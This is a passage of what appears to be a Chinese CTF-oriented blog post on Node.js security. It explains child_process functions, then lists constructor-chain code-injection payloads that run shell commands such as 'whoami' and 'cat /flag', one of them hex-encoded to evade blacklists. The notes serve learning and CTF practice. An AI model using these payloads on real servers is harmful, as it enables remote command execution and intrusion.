<h5 id="3-child-process-execFile-Sync-file-args-options-callback"><a href="#3-child-process-execFile-Sync-file-args-options-callback" class="headerlink" title="3. child_process.execFile[Sync](file[, args][, options][, callback])"></a>3. <code>child_process.execFile[Sync](file[, args][, options][, callback])</code></h5><ol>
<li><code>child_process.execFile[Sync](file[, args][, options][, callback])</code><ol>
<li>执行一个可执行文件，可以通过shell参数来执行命令<ol>
<li>默认不通过shell，这意味着你不能利用 shell 的功能，比如 I&#x2F;O 重定向和管道 –&gt; <code>execFile(&#39;/bin/ls&#39;, [&#39;-la&#39;])</code> 会直接调用 <code>/bin/ls</code> 并传递 <code>-la</code> 参数</li>
</ol>
</li>
<li><strong>要求</strong><ol>
<li><p>被执行的文件一定要有可执行权限，如果是类似.py类的特定语言的脚本，一定在开头指定解释器程序路径</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定 Python 解释器的路径和脚本路径</span></span><br><span class="line"><span class="keyword">const</span> pythonPath = <span class="string">&#x27;/usr/bin/python3&#x27;</span>; <span class="comment">// 或者你系统中 Python 的实际路径</span></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./script.py&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line"><span class="title function_">execFile</span>(pythonPath, [scriptPath, ...args], <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
</ol>
<h5 id="4-child-process-fork-modulePath-args-options"><a href="#4-child-process-fork-modulePath-args-options" class="headerlink" title="4. child_process.fork(modulePath[, args][, options])"></a>4. <code>child_process.fork(modulePath[, args][, options])</code></h5><ol>
<li><code>fork()</code> 函数可用于创建一个新的 Node.js 进程，该进程与父进程共享相同的内存空间。这意味着<strong>父进程和子进程可以相互通信并访问彼此的变量和函数</strong><ol>
<li>与child_process.spawn()类似，返回一个ChildProcess对象。返回的ChildProcess将有一个额外的内置通信通道，允许消息在父进程和子进程之间来回传递 –&gt; 详见api文档</li>
<li>派生的Node.js子进程独立于父进程，但两者之间建立的IPC通信通道除外。每个进程都有自己的内存和V8实例。由于需要额外的资源分配，不建议生成大量的子Node.js进程</li>
</ol>
</li>
<li><strong>无法执行任意命令</strong>: child_process.fork()不支持child_process.spawn()中可用的shell选项，如果设置该选项，则将被忽略</li>
</ol>
<h5 id="补充的外部module"><a href="#补充的外部module" class="headerlink" title="补充的外部module"></a>补充的外部module</h5><ol>
<li>shelljs module from npm</li>
<li>simple-git</li>
</ol>
<h2 id="RCE-Tricks"><a href="#RCE-Tricks" class="headerlink" title="*RCE Tricks"></a>*RCE Tricks</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h3 id="原型链constructor构造载体"><a href="#原型链constructor构造载体" class="headerlink" title="原型链constructor构造载体"></a>原型链constructor构造载体</h3><h4 id="IIFE和Function"><a href="#IIFE和Function" class="headerlink" title="IIFE和Function"></a>IIFE和Function</h4><ol>
<li>在js中所有函数对象都是通过Function构造函数创建的 –&gt; 函数对象的<code>func.__proto__.constructor==Function</code>(通过原型链直接<code>func.constructor也是</code>)</li>
<li><strong>利用思路</strong>: 使用Function()来实现任意函数，并且通过抬手可得的原始类型(与包装对象有自动转换机制，<strong>自动装箱和拆箱</strong>)获取Function，这里以<code>Number</code>为例子<ol>
<li>Number.prototype 是所有 Number 实例的原型</li>
<li>Number 本身是一个函数，它的原型是 <code>Function.prototype</code></li>
<li>通过<code>(1).constructor.constructor</code>访问到<code>Function</code>对象</li>
</ol>
</li>
<li><em><strong><code>Function</code>对象</strong></em><ol>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">mdn Function</a></li>
<li><code>Function([arg1, arg2, ..., argN], functionBody)</code>可以构造<code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b;&#39;);</code></li>
</ol>
</li>
<li>*<strong>立即调用函数表达式IIFE</strong><ol>
<li><p>作用: 创建一个独立的作用域，以避免变量污染全局命名空间。IIFE 可以有效地封装变量和函数，使其对外部不可见</p>
</li>
<li><p>js两种调用形式</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h4 id="constructor-payload"><a href="#constructor-payload" class="headerlink" title="constructor payload"></a>constructor payload</h4><ol>
<li>CJS版本<ol>
<li><code>(1).constructor.constructor(&quot;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();&quot;)();</code></li>
<li><code>(1).constructor.constructor(&#39;return require(&quot;child_process&quot;).execSync(`\x64\x69\x72`).toString();&#39;)();</code> –&gt; 当exec中为十六进制时，要把单引号’改成反引号&#96;这里是js模板字符串</li>
</ol>
</li>
<li>ES6版本<ol>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97">mdn 动态加载模块</a></li>
<li><code>(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(cp=&gt;&#123;cp.exec(&#39;cat /flag&#39;);&#125;);&quot;)();</code></li>
</ol>
</li>
<li>实际操作可以写一个探测脚本，现在没必要</li>
</ol>
<h3 id="PP2RCE"><a href="#PP2RCE" class="headerlink" title="PP2RCE"></a>PP2RCE</h3><ol>
<li>详见recurrence: SycServer2_SCTF24</li>
</ol>
<h3 id="global-process-mainModule-constructor-load"><a href="#global-process-mainModule-constructor-load" class="headerlink" title="global.process.mainModule.constructor._load"></a>global.process.mainModule.constructor._load</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
<li>nodejs基础<ol>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-tutorial.html">菜鸟教程</a></li>
<li><a target="_blank" rel="noopener" href="https://liaoxuefeng.com/books/javascript/nodejs/">廖雪峰</a></li>
<li>可以看看，感觉不错，其中具体模块可以看看api文档这些<a target="_blank" rel="noopener" href="https://juejin.cn/post/7218117377053098039">系列专栏</a></li>
<li>其他核心概念：模块、事件驱动架构、异步 I&#x2F;O、流、缓冲区、全局对象、Node.js 运行时、节点包管理器 (npm)、事件循环、中间件和错误处理</li>
</ol>
</li>
<li>具体执行命令<ol>
<li>官方<a target="_blank" rel="noopener" href="https://nodejs.org/api/child_process.html">api文档</a></li>
<li>看看学过人怎么讲<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000045261949#item-3-2">child_process</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/cindy647/article/details/108830841">外置模块</a></li>
<li>可以多查查绕过</li>
</ol>
</li>
<li>nodejs漏洞利用<ol>
<li><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/#eval%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">个人博客，很不错的一篇，点很多</a></li>
<li><a target="_blank" rel="noopener" href="https://wiki.scuctf.com/ctfwiki/web/1.nodejs/nodejs/">川大ctf wiki</a></li>
</ol>
</li>
</ol>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nodejs%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Nodejs前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CJS-and-EJS"><span class="toc-number">1.1.</span> <span class="toc-text">CJS and EJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#module-in-CJS"><span class="toc-number">1.2.</span> <span class="toc-text">module in CJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Express中间件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nodejs%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">Nodejs执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Inject-Point-%E8%BD%BD%E4%BD%93%E2%89%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.1.</span> <span class="toc-text">Inject Point(载体≈代码执行)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#child-process-%E5%86%85%E7%BD%AE-module"><span class="toc-number">1.4.2.</span> <span class="toc-text">child_process 内置 module</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-child-process-exec-command-options-callback-%E5%92%8Cchild-process-execSync-command-options"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-child-process-spawn-command-args-options-%E5%92%8Cchild-process-spawnSync-command-args-options"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-child-process-execFile-Sync-file-args-options-callback"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3. child_process.execFile[Sync](file[, args][, options][, callback])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-child-process-fork-modulePath-args-options"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4. child_process.fork(modulePath[, args][, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E7%9A%84%E5%A4%96%E9%83%A8module"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">补充的外部module</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-Tricks"><span class="toc-number">2.</span> <span class="toc-text">*RCE Tricks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">黑名单绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BEconstructor%E6%9E%84%E9%80%A0%E8%BD%BD%E4%BD%93"><span class="toc-number">2.2.</span> <span class="toc-text">原型链constructor构造载体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIFE%E5%92%8CFunction"><span class="toc-number">2.2.1.</span> <span class="toc-text">IIFE和Function</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#constructor-payload"><span class="toc-number">2.2.2.</span> <span class="toc-text">constructor payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PP2RCE"><span class="toc-number">2.3.</span> <span class="toc-text">PP2RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#global-process-mainModule-constructor-load"><span class="toc-number">2.4.</span> <span class="toc-text">global.process.mainModule.constructor._load</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">3.</span> <span class="toc-text">Ref</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&text=Nodejs安全"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&is_video=false&description=Nodejs安全"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nodejs安全&body=Check out this article: https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&name=Nodejs安全&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&t=Nodejs安全"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    KC1zs4&#39;s Blog
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'kc1zs4-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
